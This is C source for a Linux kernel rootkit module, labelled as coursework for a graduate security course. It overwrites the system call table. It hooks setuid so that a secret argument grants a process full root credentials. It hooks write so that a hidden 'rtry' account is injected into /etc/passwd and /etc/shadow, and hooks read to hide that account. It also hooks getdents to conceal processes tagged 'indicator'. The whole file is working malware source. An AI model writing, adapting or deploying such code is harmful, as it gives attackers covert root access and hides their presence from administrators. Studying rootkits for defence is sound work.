//allows us to perform certain kernel-level operations, such as printk
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/ctype.h>
#include <linux/dcache.h>
#include <linux/file.h>
//processes directory
#include <linux/proc_fs.h>


struct linux_dirent {
	long           d_ino;
	off_t          d_off;
	unsigned short d_reclen;
	char           d_name[];
};


MODULE_LICENSE("GPL");
MODULE_AUTHOR("1337");
MODULE_VERSION("1.0");
MODULE_DESCRIPTION("This is a rootkit module written for a graduate computer security course at Stony Brook University. ");

unsigned long * sys_call_table;

asmlinkage int (*real_setuid) (uid_t uid);
asmlinkage int (*real_setuid32) (uid_t uid);
asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);

asmlinkage long (*real_read)(unsigned int, char __user *, size_t);
asmlinkage long (*real_write)(unsigned int, char __user *, size_t);


asmlinkage long hijacked_write(unsigned int fd, char __user *buf, size_t count) 
{
	char *kbuf = NULL, *path = NULL,*str = NULL;
	char *passwd = "/etc/passwd";
	char *shadow = "/etc/shadow";
	struct file *f = fget(fd);
	int path_len;
	long num_writes = real_write(fd, buf, count); 
	if ( num_writes < 0)
		goto out;
	if(f == NULL) {
		goto out;
	}
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_writes = -ENOMEM;
		goto out;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	path_len = strlen(path);
	if(path_len >= 11 && strstr(path, passwd) == path)
			str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
	else if(path_len >= 11 && strstr(path, shadow) == path)
		str = "rtry:!:17128:0:99999:7:::\n";
	if(str != NULL && count != 0) {
		copy_from_user(kbuf,buf,PAGE_SIZE);
		copy_to_user(buf,str,strlen(str));
		real_write(fd,buf,strlen(str));
		copy_to_user(buf,kbuf,PAGE_SIZE);
	}
	
out:
	if(kbuf != NULL)
		kfree(kbuf);
	return num_writes;
}

asmlinkage long hijacked_read(unsigned int fd, char __user *userbuf, size_t count)
{
	char *kbuf = NULL, *path = NULL, *buf = NULL;
	long num_reads = real_read(fd,userbuf, count); 
	struct file *f = fget(fd);
	char *str = NULL ,*try = NULL;
	int len1 = 0, len = 0;
	if ( num_reads <= 0)
		goto out;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	if(f == NULL) {
		goto out;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	if(strcmp(path,"/etc/passwd") == 0) 
		str = "rtry:x:1001:1001::/home/rtry:/bin/sh\n";
	else if(strcmp(path,"/etc/shadow") == 0)
		str = "rtry:!:17128:0:99999:7:::\n";
	if(str != NULL) {
		buf = kmalloc(num_reads, GFP_KERNEL);
		if(buf == NULL){
			num_reads= -ENOMEM;
			goto out;
		}
		if(copy_from_user(buf,userbuf,strlen(userbuf))!=0){
			goto out;
		}

		try = strnstr(buf,str,num_reads);
		if(try != NULL) {
			len = strlen(str);	
			len1 = (buf + num_reads) - (try + len);
			memmove(try, try+len,len1);
			copy_to_user(userbuf,buf,num_reads - len);
		}
	}
out:
	if(buf != NULL)
		kfree(buf);
	if(kbuf != NULL) {
		kfree(kbuf);
	}
	return num_reads - len;
}


/*
 * Hijacked setuid sets the ids of calling process to root if it
 * knows the secret of rootkit i.e calling process is malicious
 * uid: uid that needs to set or INT_MAX if uid needs to be set to 0
 */
asmlinkage int hijacked_setuid(uid_t uid){
	struct cred *new;
	/*
	 * If uid is INT_MAX, then the ids of the calling process will
	 * be set to root (0)
	 */
	if (uid == INT_MAX){
		new = prepare_creds();
                new->uid = 0;
                new->gid = 0;
                new->suid = 0;
                new->sgid = 0;
                new->euid = 0;
                new->egid = 0;
                new->fsuid = 0;
                new->fsgid = 0;
		/*
		 * Commit the new permission for calling (malicious) process
		 */
		return commit_creds(new);
	}
		/*
		 * By default call the original setuid syscall
		 */
		return real_setuid(uid);
}

int isnumber(char *num){
	int i;
	int b = 1;
	int numlen = strlen(num);
	for(i = 0; i < numlen; i++){
		if(!isdigit(num[i])){
			b = 0;
			break;
		}
	}
	return b;
}

asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){
	
	char kbuf[128];
	char kbuf2[128]; 
	char *path;
	mm_segment_t fs;
	int i, readnums, size, k;
	struct linux_dirent *cdirp, *pdirp = NULL;
	struct file *f = fget(fd), *fcmdline;
	long start_offset = (long)dirp;
	int num_reads = real_getdents(fd, dirp, count);

	bool isproc = false;

	cdirp = dirp;
	printk(KERN_INFO "hijacked call.\n");
	printk(KERN_INFO "num reads: %d\n",num_reads);

	

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent*)(start_offset + i);
		
		if (isnumber(cdirp->d_name)){
			for (k = 0; k<128; k++){
				kbuf[k] = 0;
				kbuf2[k] = 0;
			}
			//initialize kbuf2 to the process cmdline folder /proc/<PID>/cmdline
			kbuf2[0] = '/';
			kbuf2[1] = 'p';
			kbuf2[2] = 'r';
			kbuf2[3] = 'o';
			kbuf2[4] = 'c';
			kbuf2[5] = '/';
			size = strlen(cdirp->d_name);
			for (k = 0; k < size; k++){
				kbuf2[k+6] = (cdirp->d_name)[k];
			}
			kbuf2[size+6] = '/';
			kbuf2[size+7] = 'c';
			kbuf2[size+8] = 'm';
			kbuf2[size+9] = 'd';
			kbuf2[size+10] = 'l';
			kbuf2[size+11] = 'i';
			kbuf2[size+12] = 'n';
			kbuf2[size+13] = 'e';
			//open
			fcmdline = filp_open(kbuf2, O_RDONLY,0);
			
			if (fcmdline == NULL) printk(KERN_ALERT "filp_open error.\n");
			else {
				//get current segment descriptor
				fs = get_fs();
				//set segment descriptor associated to kernel space
				set_fs(get_ds());
				//read file
				fcmdline->f_op->read(fcmdline, kbuf, 128, &fcmdline->f_pos);
				//restore segment descriptor
				set_fs(fs);
				//check process for "test"
				printk(KERN_INFO "kbuf: %s\n",kbuf);
				if(strstr(kbuf, "indicator")!=NULL){
					printk("File to hide %s\n", kbuf2);
					pdirp->d_reclen += cdirp->d_reclen;
				}

			}
			filp_close(fcmdline, NULL);

		}
		/*set previous dirp to current dirp (to be used next iteration of loop)*/
		pdirp = cdirp;

		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);

	}
	

			

	return num_reads;
}



// make the address writable if it is write-protected.
int make_rw(unsigned long address){
	unsigned int level;
      	pte_t *pte = lookup_address(address, &level);
	if(pte->pte &~ _PAGE_RW)
	pte->pte |= _PAGE_RW;
	return 0;
}

int make_ro(unsigned long address){
      unsigned int level;
      pte_t *pte = lookup_address(address, &level);
      pte->pte = pte->pte &~ _PAGE_RW;
      return 0;
}



void hijack_sys_call_table(void){
	make_rw((unsigned long)sys_call_table);
        real_getdents = (void*)*(sys_call_table + __NR_getdents);
        real_setuid = (void*)*(sys_call_table + __NR_setuid);
        real_setuid32 = (void*)*(sys_call_table + __NR_setuid32);
	real_read = (void*)*(sys_call_table + __NR_read);
	real_write = (void*)*(sys_call_table + __NR_write);
	*(sys_call_table + __NR_read) = (unsigned long)hijacked_read;
        *(sys_call_table + __NR_write) = (unsigned long)hijacked_write;
	*(sys_call_table + __NR_getdents) = (unsigned long)hijacked_getdents;
        *(sys_call_table + __NR_setuid) = (unsigned long)hijacked_setuid;
        *(sys_call_table + __NR_setuid32) = (unsigned long)hijacked_setuid;
	make_ro((unsigned long)sys_call_table);
}



int init_module(void){
	
	/*
	pointer to the system call table. The address is currently hardcoded,
	taken from the /boot/System map file. This address seems to be the same
	after every boot, so for now it can be hardcoded.
	*/
	sys_call_table = (unsigned long*)0xc1688140;
	//sys_call_table = (unsigned long*)0xc15c3060;
	hijack_sys_call_table();	
	


	printk(KERN_INFO "Rootkit added.\n\n");


	return 0;
}

void cleanup_module(void){
      	make_rw((unsigned long)sys_call_table);
	*(sys_call_table + __NR_getdents) = (unsigned long)real_getdents;
        *(sys_call_table + __NR_setuid) = (unsigned long)real_setuid;
        *(sys_call_table + __NR_setuid32) = (unsigned long)real_setuid32;
	*(sys_call_table + __NR_read) = (unsigned long)real_read;
        *(sys_call_table + __NR_write) = (unsigned long)real_write;
	make_ro((unsigned long)sys_call_table);
	printk(KERN_INFO "Rootkit removed.\n");
}
